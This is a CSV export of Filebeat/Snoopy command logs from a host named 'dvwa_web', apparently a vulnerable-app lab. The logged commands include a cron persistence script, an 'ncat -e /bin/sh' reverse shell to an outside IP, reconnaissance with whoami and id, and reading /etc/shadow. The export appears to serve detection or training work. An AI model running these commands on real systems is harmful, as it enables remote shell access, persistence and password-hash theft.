"@timestamp","_id","_index","_score","agent.ephemeral_id","agent.hostname","agent.id","agent.name","agent.type","agent.version",command,cwd,"ecs.version","event.dataset","event.ingested",filename,"host.architecture","host.containerized","host.hostname","host.id","host.ip","host.mac","host.name","host.os.codename","host.os.family","host.os.kernel","host.os.name","host.os.name.text","host.os.platform","host.os.type","host.os.version","input.type","log.file.path","log.offset",message,sid,tty,uid
"Oct 24, 2022 @ 23:26:16.604",HteaCoQBDsc6tFfSCAsI,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","cat /etc/shadow","/root","8.0.0",snoopy,"Oct 24, 2022 @ 23:26:17.606","/bin/cat","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","654,718","[uid:0 sid:256432 tty:(none) cwd:/root filename:/bin/cat]: cat /etc/shadow",256432,"(none)",0
"Oct 24, 2022 @ 23:26:10.603",T9eZCoQBDsc6tFfS7Arf,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","ncat -e /bin/sh 123.123.123.250 9002","/root","8.0.0",snoopy,"Oct 24, 2022 @ 23:26:10.654","/usr/bin/ncat","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","654,413","[uid:0 sid:256432 tty:(none) cwd:/root filename:/usr/bin/ncat]: ncat -e /bin/sh 123.123.123.250 9002",256432,"(none)",0
"Oct 24, 2022 @ 23:26:10.603",UNeZCoQBDsc6tFfS7Arf,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","/bin/sh","/root","8.0.0",snoopy,"Oct 24, 2022 @ 23:26:10.655","/bin/sh","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","654,514","[uid:0 sid:256432 tty:(none) cwd:/root filename:/bin/sh]: /bin/sh",256432,"(none)",0
"Oct 24, 2022 @ 23:26:10.603",UdeZCoQBDsc6tFfS7Arf,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3",whoami,"/root","8.0.0",snoopy,"Oct 24, 2022 @ 23:26:10.655","/usr/bin/whoami","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","654,580","[uid:0 sid:256432 tty:(none) cwd:/root filename:/usr/bin/whoami]: whoami",256432,"(none)",0
"Oct 24, 2022 @ 23:26:10.603",UteZCoQBDsc6tFfS7Arf,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3",id,"/root","8.0.0",snoopy,"Oct 24, 2022 @ 23:26:10.655","/usr/bin/id","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","654,653","[uid:0 sid:256432 tty:(none) cwd:/root filename:/usr/bin/id]: id",256432,"(none)",0
"Oct 24, 2022 @ 23:25:16.597","XdaZCoQBDsc6tFfSHf-M",".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","sh persistence_script.sh","/exploits/Persistence","8.0.0",snoopy,"Oct 24, 2022 @ 23:25:17.579","/bin/sh","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","653,565","[uid:0 sid:256075 tty:/dev/pts/0 cwd:/exploits/Persistence filename:/bin/sh]: sh persistence_script.sh",256075,"/dev/pts/0",0
"Oct 24, 2022 @ 23:25:16.597","XtaZCoQBDsc6tFfSHf-M",".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","id -u","/exploits/Persistence","8.0.0",snoopy,"Oct 24, 2022 @ 23:25:17.579","/usr/bin/id","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","653,668","[uid:0 sid:256075 tty:/dev/pts/0 cwd:/exploits/Persistence filename:/usr/bin/id]: id -u",256075,"/dev/pts/0",0
"Oct 24, 2022 @ 23:25:16.597","X9aZCoQBDsc6tFfSHf-M",".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","crontab -l","/exploits/Persistence","8.0.0",snoopy,"Oct 24, 2022 @ 23:25:17.579","/usr/bin/crontab","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","653,756","[uid:0 sid:256075 tty:/dev/pts/0 cwd:/exploits/Persistence filename:/usr/bin/crontab]: crontab -l",256075,"/dev/pts/0",0
"Oct 24, 2022 @ 23:25:16.597","YNaZCoQBDsc6tFfSHf-M",".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","grep -v ncat -e /bin/sh 123.123.123.250 9002","/exploits/Persistence","8.0.0",snoopy,"Oct 24, 2022 @ 23:25:17.579","/bin/grep","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","653,854","[uid:0 sid:256075 tty:(none) cwd:/exploits/Persistence filename:/bin/grep]: grep -v ncat -e /bin/sh 123.123.123.250 9002",256075,"(none)",0
"Oct 24, 2022 @ 23:25:16.597","YdaZCoQBDsc6tFfSHf-M",".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","crontab -","/exploits/Persistence","8.0.0",snoopy,"Oct 24, 2022 @ 23:25:17.579","/usr/bin/crontab","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","653,975","[uid:0 sid:256075 tty:(none) cwd:/exploits/Persistence filename:/usr/bin/crontab]: crontab -",256075,"(none)",0
